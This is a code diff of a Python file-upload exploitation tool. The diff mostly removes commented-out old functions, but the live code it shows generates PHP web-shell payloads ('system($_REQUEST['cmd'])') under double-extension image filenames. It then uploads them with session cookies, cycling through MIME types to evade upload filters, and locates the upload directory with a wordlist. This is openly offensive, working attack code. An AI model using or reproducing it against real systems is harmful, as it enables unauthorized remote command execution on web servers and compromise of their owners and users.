@@ -33,7 +33,7 @@ def create_payloads():
 
     reverse_shell = "<?php system($_REQUEST['cmd']); ?>"
 
-    # ✅ Required Payload Filenames (DO NOT REMOVE)
+    # Required Payload Filenames
     payloads = [
         "shell.php.jpg",
         "shell.php.png",   
@@ -55,16 +55,13 @@ def create_payloads():
     ]
 
     created_files = []
-    target_size = 5900  # Target file size (5.9 KB)
+    target_size = 5900  # Set estimated target file size (5.9 KB)
 
     for filename in payloads:
         try:
             padding = "A" * (target_size - len(reverse_shell.encode('utf-8')))  # Ensures ~5.9 KB
             with open(filename, 'w') as f:
                 f.write(reverse_shell + "\n" + padding)
-
-            # Embed PHP in metadata to keep image structure valid
-            # embed_php_in_image("clean_image.jpg", filename)
 
             print(f"[+] Created and embedded payload: {filename} ({os.path.getsize(filename)} bytes)")
             created_files.append(filename)
@@ -73,41 +70,6 @@ def create_payloads():
             print(f"[-] Error creating payload {filename}: {e}")
 
     return created_files
-
-# def upload_file(upload_url, payload_filename, cookie, mime_types_file="content_type.txt"):
-#     """
-#     Attempt to upload a file using multiple MIME types.
-#     """
-#     # Headers
-#     headers = {
-#         "Cookie": "PHPSESSID="+cookie["PHPSESSID"]
-#     }
-#     data = {
-#         "complaint": "123",
-#     }
-#     # data = {'Upload': 'Upload', 'MAX_FILE_SIZE': '100000'}
-#     mime_types = load_mime_types(mime_types_file)
-
-#     for mime_type in mime_types:
-#         try:
-#             with open(payload_filename, 'rb') as file:
-#                 file_to_upload = {'attachment': (payload_filename, file, mime_type)}
-#                 # file_to_upload = {'upload_file': (payload_filename, file, mime_type)}
-#                 print(f"[*] Trying upload with MIME type: Filename: {payload_filename} : {mime_type} to {upload_url}...")
-#                 response = requests.post(upload_url, headers=headers, data=data, files=file_to_upload, cookies=cookie)
-                
-#                 print(response.text)
-#                 if "successfully uploaded!" in response.text or "submitted successfully" in response.text:
-#                     print(f"[+] File uploaded successfully using MIME type: {mime_type}")
-#                     return True
-#                 else:
-#                     print(f"[-] Upload failed with MIME type: {mime_type}")
-
-#         except Exception as e:
-#             print(f"[-] Upload error with MIME type {mime_type}: {str(e)}")
-
-#     print("[-] File upload failed with all MIME types.")
-#     return False
 
 
 def upload_file(payload_filename, upload_url, cookie, form_details, mime_types_file):
@@ -135,7 +97,6 @@ def upload_file(payload_filename, upload_url, cookie, form_details, mime_types_f
     for textarea in form_details["textarea"]:
         data[textarea] = "test"
 
-    # data = {'Upload': 'Upload', 'MAX_FILE_SIZE': '100000'}
     mime_types = load_mime_types(mime_types_file)
 
     for mime_type in mime_types:
@@ -159,19 +120,6 @@ def upload_file(payload_filename, upload_url, cookie, form_details, mime_types_f
     print("[-] File upload failed with all MIME types.")
     return False
 
-
-# def upload_files(payload_filenames, upload_url, cookie, mime_types_file="content_type.txt"):
-#     """Upload payloads and verify if they are uploaded successfully."""
-#     uploaded_files = []
-#     failed_files = []
-    
-#     for filename in payload_filenames:
-#         if upload_file(upload_url, filename, cookie, mime_types_file):
-#             uploaded_files.append(filename)
-#         else:
-#             failed_files.append(filename)
-
-#     return uploaded_files, failed_files
 
 def get_upload_directory(base_url, wordlist_file, payload_filenames, cookie):
     """Find where uploaded files are stored."""
